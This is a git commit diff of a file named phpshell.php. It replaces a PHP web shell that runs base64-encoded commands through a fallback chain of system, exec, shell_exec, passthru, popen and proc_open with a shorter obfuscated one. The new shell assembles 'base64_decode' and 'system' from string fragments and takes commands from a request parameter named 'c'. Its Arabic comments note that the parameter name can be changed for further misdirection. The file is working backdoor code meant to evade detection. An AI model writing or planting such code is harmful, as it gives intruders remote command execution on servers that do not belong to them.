bc831969cb75e4c9f71567627008714e0aa63aa4
alsabah313 <hassan.alsabah313@gmail.com>
2025-07-24 05:15:21 +0300

    Update phpshell.php

--- phpshell.php
+++ phpshell.php
@@ -1,62 +1,12 @@
 <?php
-// PHP shell: command sent as base64 in 'cmd' parameter
+$decode = 'base'.'64_decode';     // دالة فك التشفير
+$exec = 's'.'y'.'stem';           // دالة تنفيذ الأمر
+$param = 'c';                     // اسم الباراميتر (يمكن تغييره لتضليل إضافي)
 
-error_reporting(0);
-
-function execute($cmd) {
-    if (function_exists('system')) {
-        @system($cmd);
-        return;
-    }
-    if (function_exists('exec')) {
-        @exec($cmd, $output);
-        echo implode("\n", $output);
-        return;
-    }
-    if (function_exists('shell_exec')) {
-        echo @shell_exec($cmd);
-        return;
-    }
-    if (function_exists('passthru')) {
-        @passthru($cmd);
-        return;
-    }
-    if (function_exists('popen')) {
-        $fp = @popen($cmd, 'r');
-        if ($fp) {
-            while (!feof($fp)) {
-                echo fread($fp, 4096);
-            }
-            pclose($fp);
-        }
-        return;
-    }
-    if (function_exists('proc_open')) {
-        $descriptorspec = array(
-            0 => array("pipe", "r"),
-            1 => array("pipe", "w"),
-            2 => array("pipe", "w")
-        );
-        $process = @proc_open($cmd, $descriptorspec, $pipes);
-        if (is_resource($process)) {
-            echo stream_get_contents($pipes[1]);
-            fclose($pipes[1]);
-            proc_close($process);
-        }
-        return;
-    }
-    echo "No available execution function.";
-}
-
-if (isset($_GET['cmd'])) {
-    $cmd = base64_decode($_GET['cmd']);
+if (isset($_REQUEST[$param])) {
+    $cmd = $decode($_REQUEST[$param]);  // فك تشفير الأمر
     echo "<pre>";
-    execute($cmd);
+    @$exec($cmd);                      // تنفيذ الأمر
     echo "</pre>";
-} else {
-    echo '<form method="get">
-        <input type="text" name="cmd" placeholder="Enter base64 command" />
-        <input type="submit" value="Execute" />
-    </form>';
 }
 ?>
